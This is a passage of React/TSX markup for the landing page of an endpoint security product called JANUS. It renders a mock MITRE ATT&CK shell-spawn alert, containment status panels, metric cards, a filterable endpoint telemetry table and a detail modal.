                    <span className="inline-block px-1.5 py-0.5 rounded bg-purple-950/60 border border-purple-500/30 text-purple-300 text-[8px]">
                      Agent CPU: 0.8%
                    </span>
                  </div>
                </div>
              </div>
            </div>

            {/* 2. Top-Left Floating Window: MITRE ATT&CK Behavioral Alert */}
            <div className="absolute left-0 top-0 w-[82%] sm:w-[76%] bg-[#1a0e24]/95 rounded-xl border border-purple-500/40 shadow-[0_20px_50px_rgba(0,0,0,0.8)] p-3.5 z-20 text-white font-sans text-xs backdrop-blur-md">
              <div className="flex items-center justify-between pb-2 border-b border-white/10">
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-red-400 animate-ping" />
                  <span className="font-semibold text-white text-[11px]">
                    MITRE T1059.004: LOLBin Command Shell
                  </span>
                </div>
                <span className="font-mono text-[9px] text-red-400 font-bold bg-red-950/40 px-2 py-0.5 rounded border border-red-500/30">
                  Confidence: 99.4%
                </span>
              </div>

              <div className="py-2 space-y-1 font-mono text-[10px] text-white/70">
                <div className="flex justify-between">
                  <span>Parent: <strong className="text-white">nginx [pid:884]</strong></span>
                  <span>Spawned: <strong className="text-red-300">/bin/bash</strong></span>
                </div>
                <div className="text-[9px] text-purple-300/80 truncate">
                  Target: /tmp/.payload_exec (Living-off-the-land pattern)
                </div>
              </div>

              <div className="flex items-center justify-between pt-2 border-t border-white/10">
                <div className="flex items-center gap-1.5 text-[9px] text-emerald-400 font-mono">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                  <span>Deterministic Rule Verified</span>
                </div>
                <div className="flex gap-1.5">
                  <button className="px-2 py-1 rounded bg-red-600/80 hover:bg-red-500 text-white font-medium text-[9px] shadow-sm">
                    Freeze PID
                  </button>
                  <button className="px-2 py-1 rounded bg-purple-600 hover:bg-purple-500 text-white font-medium text-[9px] shadow-sm">
                    Quarantine Port
                  </button>
                </div>
              </div>
            </div>

            {/* 3. Bottom-Left Floating Window: Hardware-Coordinated Containment Status */}
            <div className="absolute left-2 sm:left-4 bottom-2 w-[74%] sm:w-[68%] bg-[#110717] rounded-xl border border-purple-500/40 shadow-[0_25px_60px_rgba(0,0,0,0.9)] p-3.5 z-30 text-white font-sans text-xs backdrop-blur-md">
              <div className="flex items-center justify-between mb-2.5">
                <span className="font-semibold text-xs text-white">NOC + SOC Converged Response</span>
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                  <span className="font-mono text-[9px] text-white/50">Containment Latency: 1.14s</span>
                </div>
              </div>

              <div className="space-y-1.5 font-mono text-[10px] text-white/70">
                <div className="flex items-center justify-between bg-black/40 p-1.5 rounded border border-white/5">
                  <span className="text-white/60">Host Process Isolation:</span>
                  <span className="text-emerald-400 font-semibold">SIGSTOP Enforced</span>
                </div>
                <div className="flex items-center justify-between bg-black/40 p-1.5 rounded border border-white/5">
                  <span className="text-white/60">Switch Port Quarantine:</span>
                  <span className="text-purple-300 font-semibold">VLAN 999 (SNMP CoA)</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Section 2: Measurable Endpoint Defense Without Cloud Overhead (4 Metric Cards) */}
      <section id="outcomes" className="w-full py-16 px-6 sm:px-12 lg:px-16 border-y border-white/10 bg-[#160b1b]/60">
        <div className="max-w-7xl mx-auto">
          <div className="mb-10 text-center">
            <h2 className="text-2xl sm:text-4xl font-light text-white">
              Measurable Endpoint Defense Without Cloud Overhead
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            <div className="p-8 rounded-2xl bg-gradient-to-b from-white/[0.07] to-white/[0.02] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group hover:-translate-y-1">
              <div className="text-xs font-mono text-purple-300 tracking-wider uppercase mb-3">
                Telemetry Custody
              </div>
              <div className="text-5xl font-light text-white tracking-tight mb-3">
                100%
              </div>
              <div className="text-sm text-white/70 font-light leading-relaxed">
                Air-gapped on-premise event retention with zero phone-home calls or external egress.
              </div>
            </div>

            <div className="p-8 rounded-2xl bg-gradient-to-b from-white/[0.07] to-white/[0.02] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group hover:-translate-y-1">
              <div className="text-xs font-mono text-purple-300 tracking-wider uppercase mb-3">
                Agent CPU Overhead
              </div>
              <div className="text-5xl font-light text-white tracking-tight mb-3">
                &lt; 1.2%
              </div>
              <div className="text-sm text-white/70 font-light leading-relaxed">
                Deterministic OS kernel audit framework without compute-heavy background models.
              </div>
            </div>

            <div className="p-8 rounded-2xl bg-gradient-to-b from-white/[0.07] to-white/[0.02] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group hover:-translate-y-1">
              <div className="text-xs font-mono text-purple-300 tracking-wider uppercase mb-3">
                Hardware Attribution
              </div>
              <div className="text-5xl font-light text-white tracking-tight mb-3">
                &lt; 500ms
              </div>
              <div className="text-sm text-white/70 font-light leading-relaxed">
                Instant correlation from suspicious PID to MAC address and physical switch port.
              </div>
            </div>

            <div className="p-8 rounded-2xl bg-gradient-to-b from-white/[0.07] to-white/[0.02] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group hover:-translate-y-1">
              <div className="text-xs font-mono text-purple-300 tracking-wider uppercase mb-3">
                Predictable Economics
              </div>
              <div className="text-5xl font-light text-white tracking-tight mb-3">
                0 Sensor Tax
              </div>
              <div className="text-sm text-white/70 font-light leading-relaxed">
                Flat enterprise licensing with zero per-endpoint subscription penalties or ingestion caps.
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Section 3: Comprehensive Endpoint Activity & Host Telemetry Suite */}
      <section
        id="endpoint-activity"
        className="w-full py-24 sm:py-32 px-6 sm:px-12 lg:px-16 border-b border-white/10 bg-[#120619] relative overflow-hidden"
      >
        {/* Ambient Subtle Glows */}
        <div className="absolute top-1/4 -left-40 w-96 h-96 bg-purple-600/15 rounded-full blur-[140px] pointer-events-none" />
        <div className="absolute bottom-10 -right-40 w-[32rem] h-[32rem] bg-indigo-600/15 rounded-full blur-[160px] pointer-events-none" />

        <div className="max-w-7xl mx-auto relative z-10">
          {/* Section Header */}
          <div className="max-w-4xl mb-16">
            <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-purple-950/60 border border-purple-500/30 text-purple-300 font-mono text-xs tracking-widest uppercase mb-4">
              <Activity className="w-3.5 h-3.5 text-purple-400 animate-pulse" />
              <span>Endpoint Activity &amp; Telemetry Suite</span>
            </div>
            <h2 className="text-3xl sm:text-5xl lg:text-6xl font-normal tracking-tight text-white leading-[1.15]">
              Full-Spectrum Host Activity:{" "}
              <span className="bg-gradient-to-r from-purple-200 via-purple-300 to-indigo-200 bg-clip-text text-transparent">
                Every File, Process, Port &amp; Device Audited
              </span>
            </h2>
            <p className="text-base sm:text-lg text-white/70 font-light mt-5 leading-relaxed max-w-3xl">
              Continuous, air-gapped monitoring across Windows and Linux fleets. Maintain real-time inventory, track agent connectivity, audit confidential folders, inspect processes and software packages, verify antivirus and firewall states, and control USB peripherals with instant multi-facet filtering.
            </p>
          </div>

          {/* Interactive Live Endpoint Explorer Console */}
          <div className="rounded-3xl bg-[#170a20]/95 border border-purple-500/30 shadow-[0_25px_70px_rgba(0,0,0,0.7)] backdrop-blur-xl overflow-hidden mb-20">
            {/* Top Toolbar */}
            <div className="p-5 sm:p-6 bg-[#1f0d2c] border-b border-white/10 flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="w-9 h-9 rounded-xl bg-purple-600/30 border border-purple-400/40 flex items-center justify-center">
                  <Server className="w-5 h-5 text-purple-300" />
                </div>
                <div>
                  <div className="text-sm font-medium text-white flex items-center gap-2">
                    <span>Live Fleet Activity Console</span>
                    <span className="px-2 py-0.5 rounded-full text-[10px] font-mono bg-emerald-950/60 border border-emerald-500/30 text-emerald-300 flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                      Live Auditing
                    </span>
                  </div>
                  <div className="text-xs text-white/50 font-light">
                    Real-time host telemetry without external cloud dependencies
                  </div>
                </div>
              </div>

              {/* Search Bar Input */}
              <div className="w-full lg:w-96 relative">
                <Search className="w-4 h-4 text-white/40 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                <input
                  type="text"
                  value={activitySearchQuery}
                  onChange={(e) => setActivitySearchQuery(e.target.value)}
                  placeholder="Filter by hostname, IP, OS, confidential folder, USB, or AV..."
                  className="w-full bg-[#120718] border border-white/10 rounded-xl pl-10 pr-4 py-2.5 text-xs text-white placeholder-white/40 focus:outline-none focus:border-purple-400/60 focus:ring-1 focus:ring-purple-400/30 transition-all font-mono"
                />
                {activitySearchQuery && (
                  <button
                    onClick={() => setActivitySearchQuery("")}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-white/40 hover:text-white cursor-pointer"
                  >
                    <X className="w-3.5 h-3.5" />
                  </button>
                )}
              </div>
            </div>

            {/* Quick Filter Presets Strip */}
            <div className="px-5 sm:px-6 py-3 bg-[#170a20] border-b border-white/5 flex flex-wrap items-center gap-2 overflow-x-auto">
              <span className="text-[11px] font-mono text-white/40 uppercase tracking-wider mr-2 flex items-center gap-1">
                <Filter className="w-3 h-3" />
                <span>Presets:</span>
              </span>
              {[
                { id: "all", label: "All Endpoints", count: MOCK_ENDPOINTS.length },
                { id: "windows", label: "Windows Fleet", count: MOCK_ENDPOINTS.filter((e) => e.os === "Windows").length },
                { id: "linux", label: "Linux Nodes", count: MOCK_ENDPOINTS.filter((e) => e.os === "Linux").length },
                { id: "alerts", label: "AV / Firewall Inactive", count: 1 },
                { id: "confidential", label: "Confidential Folder FIM", count: MOCK_ENDPOINTS.length },
                { id: "usb", label: "USB Peripherals Attached", count: MOCK_ENDPOINTS.filter((e) => e.usbDevice.status !== "None").length },
              ].map((preset) => {
                const isActive = endpointFilterPreset === preset.id;
                return (
                  <button
                    key={preset.id}
                    onClick={() => setEndpointFilterPreset(preset.id)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-mono transition-all flex items-center gap-1.5 cursor-pointer ${
                      isActive
                        ? "bg-purple-600 text-white shadow-[0_0_15px_rgba(168,85,247,0.4)]"
                        : "bg-white/[0.04] text-white/70 hover:bg-white/[0.08] hover:text-white border border-white/5"
                    }`}
                  >
                    <span>{preset.label}</span>
                    <span className="px-1.5 py-0.2 rounded text-[10px] bg-black/30 text-white/60">
                      {preset.count}
                    </span>
                  </button>
                );
              })}
            </div>

            {/* Endpoints Table */}
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-light border-collapse">
                <thead>
                  <tr className="border-b border-white/10 bg-white/[0.02] text-white/50 font-mono text-[10px] uppercase tracking-wider">
                    <th className="py-4 px-4 sm:px-6">Endpoint &amp; System Info</th>
                    <th className="py-4 px-4">Agent Status</th>
                    <th className="py-4 px-4">Confidential Folder</th>
                    <th className="py-4 px-4">Processes / Apps</th>
                    <th className="py-4 px-4">Network Ports</th>
                    <th className="py-4 px-4">AV &amp; Firewall</th>
                    <th className="py-4 px-4">USB Devices</th>
                    <th className="py-4 px-4 sm:px-6 text-right">Telemetry Action</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5 font-mono">
                  {filteredEndpoints.length === 0 ? (
                    <tr>
                      <td colSpan={8} className="py-12 text-center text-white/40 font-mono">
                        No endpoints match your filter query.
                      </td>
                    </tr>
                  ) : (
                    filteredEndpoints.map((ep) => (
                      <tr
                        key={ep.id}
                        className="hover:bg-white/[0.03] transition-colors group cursor-pointer"
                        onClick={() => setSelectedEndpoint(ep)}
                      >
                        {/* Endpoint & System Info */}
                        <td className="py-4 px-4 sm:px-6">
                          <div className="flex items-center gap-2.5">
                            <div className="w-7 h-7 rounded-lg bg-purple-950/60 border border-purple-500/30 flex items-center justify-center shrink-0">
                              {ep.os === "Windows" ? (
                                <Laptop className="w-3.5 h-3.5 text-blue-300" />
                              ) : (
                                <Server className="w-3.5 h-3.5 text-orange-300" />
                              )}
                            </div>
                            <div>
                              <div className="font-semibold text-white group-hover:text-purple-300 transition-colors flex items-center gap-1.5">
                                <span>{ep.hostname}</span>
                                <span className="text-[9px] px-1.5 py-0.5 rounded bg-white/10 text-white/60">
                                  {ep.os}
                                </span>
                              </div>
                              <div className="text-[10px] text-white/50">
                                {ep.ip} · {ep.kernel}
                              </div>
                            </div>
                          </div>
                        </td>

                        {/* Agent Status */}
                        <td className="py-4 px-4">
                          <div className="flex items-center gap-2">
                            <span
                              className={`w-2 h-2 rounded-full ${
                                ep.status === "Connected"
                                  ? "bg-emerald-400 animate-pulse"
                                  : ep.status === "Degraded"
                                  ? "bg-amber-400"
                                  : "bg-red-400"
                              }`}
                            />
                            <div>
                              <div
                                className={`text-[11px] font-medium ${
                                  ep.status === "Connected"
                                    ? "text-emerald-300"
                                    : ep.status === "Degraded"
                                    ? "text-amber-300"
                                    : "text-red-300"
                                }`}
                              >
                                {ep.status}
                              </div>
                              <div className="text-[9px] text-white/40">{ep.heartbeat}</div>
                            </div>
                          </div>
                        </td>

                        {/* Confidential Folder Monitoring */}
                        <td className="py-4 px-4">
                          <div className="max-w-[180px]">
                            <div className="flex items-center gap-1.5 text-white/90 truncate">
                              <FolderLock className="w-3 h-3 text-purple-400 shrink-0" />
                              <span className="truncate">{ep.confidentialFolder.name}</span>
                            </div>
                            <span
                              className={`inline-block text-[9px] px-1.5 py-0.5 rounded mt-0.5 ${
                                ep.confidentialFolder.hasAlert
                                  ? "bg-red-950/60 border border-red-500/40 text-red-300 font-bold"
                                  : "bg-purple-950/40 text-purple-300 border border-purple-500/20"
                              }`}
                            >
                              {ep.confidentialFolder.status}
                            </span>
                          </div>
                        </td>

                        {/* Processes & Apps */}
                        <td className="py-4 px-4">
                          <div className="text-white/80">
                            <span>{ep.activeProcesses}</span>{" "}
                            <span className="text-white/40 text-[10px]">pids</span>
                          </div>
                          <div className="text-[10px] text-white/40">
                            {ep.installedApps} pkgs installed
                          </div>
                        </td>

                        {/* Network Ports */}
                        <td className="py-4 px-4">
                          <div className="flex flex-wrap gap-1 max-w-[130px]">
                            {ep.listeningPorts.map((p) => (
                              <span
                                key={p}
                                className={`px-1.5 py-0.5 rounded text-[9px] ${
                                  p === 3389
                                    ? "bg-red-950/60 text-red-300 border border-red-500/30"
                                    : "bg-white/5 text-white/70"
                                }`}
                              >
                                :{p}
                              </span>
                            ))}
                          </div>
                        </td>

                        {/* Antivirus & Firewall */}
                        <td className="py-4 px-4">
                          <div className="flex flex-col gap-1">
                            <span
                              className={`inline-flex items-center gap-1 text-[9px] px-1.5 py-0.5 rounded w-max ${
                                ep.antivirus.enabled
                                  ? "bg-emerald-950/50 text-emerald-300 border border-emerald-500/30"
                                  : "bg-red-950/70 text-red-300 border border-red-500/40 font-bold animate-pulse"
                              }`}
                            >
                              <ShieldCheck className="w-2.5 h-2.5" />
                              <span>{ep.antivirus.enabled ? "AV Active" : "AV Disabled"}</span>
                            </span>
                            <span
                              className={`inline-flex items-center gap-1 text-[9px] px-1.5 py-0.5 rounded w-max ${
                                ep.firewall.active
                                  ? "bg-purple-950/40 text-purple-300 border border-purple-500/20"
                                  : "bg-red-950/70 text-red-300 border border-red-500/40 font-bold"
                              }`}
                            >
                              <Flame className="w-2.5 h-2.5" />
                              <span>{ep.firewall.active ? "Firewall On" : "Firewall Off"}</span>
                            </span>
                          </div>
                        </td>

                        {/* USB Devices */}
                        <td className="py-4 px-4">
                          {ep.usbDevice.status === "None" ? (
                            <span className="text-[10px] text-white/30">None attached</span>
                          ) : (
                            <div className="flex items-center gap-1.5">
                              <Usb className="w-3 h-3 text-purple-400 shrink-0" />
                              <span
                                className={`text-[10px] px-1.5 py-0.5 rounded truncate max-w-[120px] ${
                                  ep.usbDevice.status === "Blocked"
                                    ? "bg-red-950/60 border border-red-500/30 text-red-300"
                                    : "bg-white/5 text-white/80"
                                }`}
                              >
                                {ep.usbDevice.name}
                              </span>
                            </div>
                          )}
                        </td>

                        {/* Action */}
                        <td className="py-4 px-4 sm:px-6 text-right">
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedEndpoint(ep);
                            }}
                            className="px-3 py-1.5 rounded-lg bg-purple-600/60 hover:bg-purple-600 text-white text-[11px] font-mono border border-purple-400/30 shadow-sm transition-all hover:scale-105 active:scale-95 cursor-pointer"
                          >
                            Inspect →
                          </button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>

            {/* Table Footer Summary */}
            <div className="px-5 sm:px-6 py-3.5 bg-[#120718] border-t border-white/10 flex flex-col sm:flex-row items-center justify-between text-[11px] text-white/50 font-mono gap-2">
              <div className="flex items-center gap-4">
                <span>Showing {filteredEndpoints.length} of {MOCK_ENDPOINTS.length} endpoints</span>
                <span className="w-1 h-1 rounded-full bg-white/20" />
                <span className="text-emerald-400">100% telemetry retained locally</span>
              </div>
              <div className="flex items-center gap-2">
                <span>Click any row to open the complete deep-dive telemetry profile</span>
              </div>
            </div>
          </div>

          {/* 11 Deep-Dive Endpoint Activity Modules Section */}
          <div className="mb-12">
            <div className="max-w-3xl mb-8">
              <h3 className="text-2xl sm:text-4xl font-normal text-white tracking-tight">
                11 Core Endpoint Activity Modules
              </h3>
              <p className="text-sm sm:text-base text-white/60 font-light mt-2 leading-relaxed">
                Explore the modular architecture powering continuous host monitoring, confidential directory defense, and deterministic control across your fleet.
              </p>
            </div>

            {/* Category Filter Tabs */}
            <div className="flex flex-wrap items-center gap-2 mb-10">
              {ACTIVITY_CATEGORIES.map((cat) => (
                <button
                  key={cat}
                  onClick={() => setActivityCategoryFilter(cat)}
                  className={`px-3.5 py-1.5 rounded-full text-xs font-mono transition-all cursor-pointer ${
                    activityCategoryFilter === cat
                      ? "bg-purple-600 text-white shadow-[0_0_20px_rgba(168,85,247,0.35)]"
                      : "bg-white/[0.03] text-white/60 hover:bg-white/[0.08] hover:text-white border border-white/5"
                  }`}
                >
                  {cat === "all" ? "All Modules (11)" : cat}
                </button>
              ))}
            </div>

            {/* 11 Modules Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 sm:gap-8">
              {filteredCapabilities.map((item) => (
                <div
                  key={item.id}
                  className="p-8 rounded-3xl bg-gradient-to-b from-white/[0.07] to-white/[0.02] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group flex flex-col justify-between hover:-translate-y-1"
                >
                  <div>
                    {/* Top Row: Icon, Category & Number */}
                    <div className="flex items-center justify-between mb-6">
                      <div className="w-10 h-10 rounded-2xl bg-purple-950/60 border border-purple-500/30 flex items-center justify-center">
                        {renderCapabilityIcon(item.iconName)}
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="px-2.5 py-1 rounded-full text-[9px] font-mono tracking-wider uppercase bg-white/5 text-purple-300 border border-white/10">
                          {item.badge}
                        </span>
                        <span className="font-mono text-xs text-white/30">{item.number}</span>
                      </div>
                    </div>

                    {/* Title & Short Description */}
                    <h4 className="text-xl font-medium text-white mb-2 group-hover:text-purple-200 transition-colors leading-snug">
                      {item.title}
                    </h4>
                    <p className="text-xs font-mono text-purple-300/80 mb-3">
                      {item.shortDesc}
                    </p>
                    <p className="text-sm text-white/70 font-light leading-relaxed mb-6">
                      {item.description}
                    </p>

                    {/* Bullet Points */}
                    <div className="space-y-2 mb-6 border-t border-white/5 pt-4">
                      {item.bullets.map((bullet, bIdx) => (
                        <div key={bIdx} className="flex items-start gap-2.5 text-xs text-white/75 font-light">
                          <span className="text-purple-400 mt-0.5">•</span>
                          <span>{bullet}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Micro Metric Footer */}
                  <div className="pt-4 border-t border-white/10 flex items-center justify-between font-mono text-xs">
                    <span className="text-[10px] text-white/40 uppercase tracking-wider">
                      {item.metricLabel}
                    </span>
                    <span className="text-purple-300 font-semibold">{item.metricValue}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Selected Endpoint Telemetry Modal / Drawer */}
        {selectedEndpoint && (
          <div
            className="fixed inset-0 z-[120] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 sm:p-6"
            onClick={() => setSelectedEndpoint(null)}
          >
            <div
              className="bg-[#170a20] border border-purple-500/40 rounded-3xl max-w-2xl w-full p-6 sm:p-8 shadow-[0_25px_80px_rgba(0,0,0,0.9)] max-h-[90vh] overflow-y-auto"
              onClick={(e) => e.stopPropagation()}
            >
              {/* Modal Header */}
              <div className="flex items-start justify-between pb-4 border-b border-white/10 mb-6">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-purple-600/30 border border-purple-400/40 flex items-center justify-center">
                    {selectedEndpoint.os === "Windows" ? (
                      <Laptop className="w-5 h-5 text-blue-300" />
                    ) : (
                      <Server className="w-5 h-5 text-orange-300" />
                    )}
                  </div>
                  <div>
                    <h4 className="text-xl font-bold text-white flex items-center gap-2">
                      <span>{selectedEndpoint.hostname}</span>
                      <span className="text-xs font-mono px-2 py-0.5 rounded bg-purple-950/80 border border-purple-500/40 text-purple-300">
                        {selectedEndpoint.os}
                      </span>
                    </h4>
                    <div className="text-xs text-white/50 font-mono mt-0.5">
                      {selectedEndpoint.ip} · {selectedEndpoint.mac}
                    </div>
                  </div>
                </div>
                <button
                  onClick={() => setSelectedEndpoint(null)}
                  className="p-2 rounded-lg bg-white/5 hover:bg-white/10 text-white/60 hover:text-white transition-colors cursor-pointer"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* 11 Facets In-Depth Details */}
              <div className="space-y-4 font-mono text-xs">
                {/* 1. System Info & Switch Binding */}
                <div className="p-3.5 rounded-xl bg-black/40 border border-white/5">
                  <div className="text-[10px] text-purple-300 uppercase tracking-wider mb-2 font-semibold">
                    1. System Information &amp; Network Port
                  </div>
                  <div className="grid grid-cols-2 gap-2 text-white/80 text-[11px]">
                    <div>OS Build: <span className="text-white">{selectedEndpoint.osDetails}</span></div>
                    <div>Kernel: <span className="text-white">{selectedEndpoint.kernel}</span></div>
                    <div>Switch Port: <span className="text-emerald-400">{selectedEndpoint.switchPort}</span></div>
                    <div>Liveness: <span className="text-emerald-300">{selectedEndpoint.heartbeat}</span></div>
                  </div>
                </div>

                {/* 2. Confidential Folder Monitoring */}
                <div className="p-3.5 rounded-xl bg-black/40 border border-white/5">
                  <div className="text-[10px] text-purple-300 uppercase tracking-wider mb-2 font-semibold flex items-center justify-between">
                    <span>2. Confidential Folder Monitoring</span>
                    <span className="text-[9px] text-emerald-400">FIM Live Active</span>
                  </div>
                  <div className="text-white text-[11px] mb-1 flex items-center gap-1.5">
                    <FolderLock className="w-3.5 h-3.5 text-purple-400" />
                    <span>Path: {selectedEndpoint.confidentialFolder.name}</span>
                  </div>
                  <div className="text-[10px] text-white/60">
                    Status: <span className={selectedEndpoint.confidentialFolder.hasAlert ? "text-red-400 font-bold" : "text-emerald-400"}>{selectedEndpoint.confidentialFolder.status}</span>
                  </div>
                </div>

                {/* 3. Processes & Applications */}
                <div className="grid grid-cols-2 gap-3">
                  <div className="p-3.5 rounded-xl bg-black/40 border border-white/5">
                    <div className="text-[10px] text-purple-300 uppercase tracking-wider mb-1 font-semibold">
                      3. Process Monitoring
                    </div>
                    <div className="text-lg text-white font-bold">{selectedEndpoint.activeProcesses} <span className="text-xs text-white/50 font-normal">Active PIDs</span></div>
                    <div className="text-[10px] text-white/50 mt-1">eBPF Process Tree Hooked</div>
                  </div>
                  <div className="p-3.5 rounded-xl bg-black/40 border border-white/5">
                    <div className="text-[10px] text-purple-300 uppercase tracking-wider mb-1 font-semibold">
                      4. Application Inventory
                    </div>
                    <div className="text-lg text-white font-bold">{selectedEndpoint.installedApps} <span className="text-xs text-white/50 font-normal">Packages</span></div>
                    <div className="text-[10px] text-white/50 mt-1">Zero Outdated CVE Alerts</div>
                  </div>
                </div>

                {/* 4. Network Monitoring, AV & Firewall */}
                <div className="grid grid-cols-2 gap-3">
                  <div className="p-3.5 rounded-xl bg-black/40 border border-white/5">
                    <div className="text-[10px] text-purple-300 uppercase tracking-wider mb-1 font-semibold">
                      5. Antivirus Monitoring
                    </div>
                    <div className={`text-xs font-semibold ${selectedEndpoint.antivirus.enabled ? "text-emerald-300" : "text-red-400"}`}>
                      {selectedEndpoint.antivirus.name}
                    </div>
                    <div className="text-[10px] text-white/50 mt-0.5">{selectedEndpoint.antivirus.status}</div>
                  </div>
                  <div className="p-3.5 rounded-xl bg-black/40 border border-white/5">
                    <div className="text-[10px] text-purple-300 uppercase tracking-wider mb-1 font-semibold">
                      6. Host Firewall
                    </div>
                    <div className={`text-xs font-semibold ${selectedEndpoint.firewall.active ? "text-emerald-300" : "text-red-400"}`}>
                      {selectedEndpoint.firewall.profile}
                    </div>
                    <div className="text-[10px] text-white/50 mt-0.5">Filter Rules Enforced</div>
                  </div>
                </div>

                {/* 5. USB Monitoring */}
                <div className="p-3.5 rounded-xl bg-black/40 border border-white/5">
                  <div className="text-[10px] text-purple-300 uppercase tracking-wider mb-1 font-semibold">
                    7. USB Peripheral Tracking
                  </div>
                  <div className="flex items-center justify-between text-[11px]">
                    <div className="flex items-center gap-1.5 text-white">
                      <Usb className="w-3.5 h-3.5 text-purple-400" />
                      <span>{selectedEndpoint.usbDevice.name}</span>
                    </div>
                    <span className={`px-2 py-0.5 rounded text-[10px] ${
                      selectedEndpoint.usbDevice.status === "Blocked"
                        ? "bg-red-950 text-red-300 border border-red-500/30"
                        : selectedEndpoint.usbDevice.status === "None"
                        ? "bg-white/5 text-white/40"
                        : "bg-emerald-950 text-emerald-300 border border-emerald-500/30"
                    }`}>
                      {selectedEndpoint.usbDevice.status}
                    </span>
                  </div>
                </div>
              </div>

              {/* Modal Actions */}
              <div className="mt-6 pt-4 border-t border-white/10 flex items-center justify-between">
                <button
                  onClick={() => setSelectedEndpoint(null)}
                  className="px-4 py-2 rounded-xl bg-white/10 hover:bg-white/20 text-white text-xs font-mono transition-colors cursor-pointer"
                >
                  Close Inspection
                </button>
                <div className="flex items-center gap-2">
                  <button className="px-4 py-2 rounded-xl bg-red-600/80 hover:bg-red-600 text-white text-xs font-mono font-semibold shadow-sm transition-all hover:scale-105 active:scale-95 cursor-pointer">
                    Freeze Host PIDs
                  </button>
                  <button className="px-4 py-2 rounded-xl bg-purple-600 hover:bg-purple-500 text-white text-xs font-mono font-semibold shadow-sm transition-all hover:scale-105 active:scale-95 cursor-pointer">
                    Quarantine Switch Port
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}
      </section>

      {/* Section 4: Endpoint Defense at Your Fingertips (Tabbed Capability Showcase) */}
      <section id="capabilities" className="w-full py-24 sm:py-32 px-6 sm:px-12 lg:px-16">
        <div className="max-w-7xl mx-auto">
          {/* Section Header */}
          <div className="max-w-4xl mb-16">
            <h2 className="text-3xl sm:text-5xl lg:text-6xl font-normal tracking-tight text-white leading-[1.15]">
              Endpoint Defense at Your Fingertips:{" "}
              <span className="bg-gradient-to-r from-purple-200 via-purple-300 to-indigo-200 bg-clip-text text-transparent">
                Inspect, Detect, and Neutralize at Machine Speed
              </span>
            </h2>
            <p className="text-lg text-white/70 font-light mt-5 leading-relaxed max-w-3xl">
              Explore how JANUS combines continuous host auditing, deterministic MITRE ATT&CK detection, and physical Layer 2 port correlation into a sovereign defense platform.
            </p>
          </div>

          {/* Interactive 3-Tab Selector */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3 sm:gap-4 mb-8 sm:mb-10 w-full">
            {ENDPOINT_TABS.map((tab) => {
              const isActive = activeTab === tab.id;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`p-4 sm:p-5 rounded-2xl border text-left transition-all duration-300 cursor-pointer ${
                    isActive
                      ? "bg-purple-900/30 border-purple-400/50 shadow-[0_0_25px_rgba(168,85,247,0.25)] text-white"
                      : "bg-white/[0.03] border-white/10 hover:border-purple-400/20 text-white/70 hover:text-white"
                  }`}
                >
                  <div className="font-semibold text-base sm:text-lg mb-1 flex items-center justify-between">
                    <span>{tab.shortTitle}</span>
                    {isActive && <span className="w-2 h-2 rounded-full bg-purple-400 animate-pulse" />}
                  </div>
                  <div className="text-xs sm:text-sm text-white/50 font-light line-clamp-2">
                    {tab.title}
                  </div>
                </button>
              );
            })}
          </div>

          {/* Tab Content Display */}
          <div className="p-8 sm:p-12 rounded-3xl bg-gradient-to-b from-[#23142e] to-[#170c1e] border border-purple-500/20 shadow-[0_20px_50px_rgba(0,0,0,0.5)]">
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 items-center">
              {/* Left Column: Explanatory Content & Bullets */}
              <div className="lg:col-span-7 flex flex-col items-start text-left">
                <h3 className="text-2xl sm:text-3xl font-medium text-white mb-4 leading-snug">
                  {currentTab.title}
                </h3>
                <p className="text-base text-white/70 font-light leading-relaxed mb-6">
                  {currentTab.description}
                </p>

                <div className="space-y-3 mb-8 w-full">
                  {currentTab.bullets.map((bullet, idx) => (
                    <div key={idx} className="flex items-start gap-3">
                      <div className="w-5 h-5 rounded-full bg-purple-500/20 border border-purple-400/30 flex items-center justify-center shrink-0 mt-0.5">
                        <span className="text-purple-300 text-xs">✓</span>
                      </div>
                      <span className="text-sm text-white/80 font-light leading-relaxed">
                        {bullet}
                      </span>
                    </div>
                  ))}
                </div>

                {/* Micro Metric Banner */}
                <div className="p-4 rounded-xl bg-purple-950/40 border border-purple-500/30 flex items-center justify-between w-full">
                  <div>
                    <div className="font-mono text-xs text-purple-300 uppercase tracking-wider">
                      {currentTab.metrics.label}
                    </div>
                    <div className="text-xs text-white/50 font-light mt-0.5">
                      {currentTab.metrics.sub}
                    </div>
                  </div>
                  <div className="text-2xl font-bold text-white tracking-tight">
                    {currentTab.metrics.value}
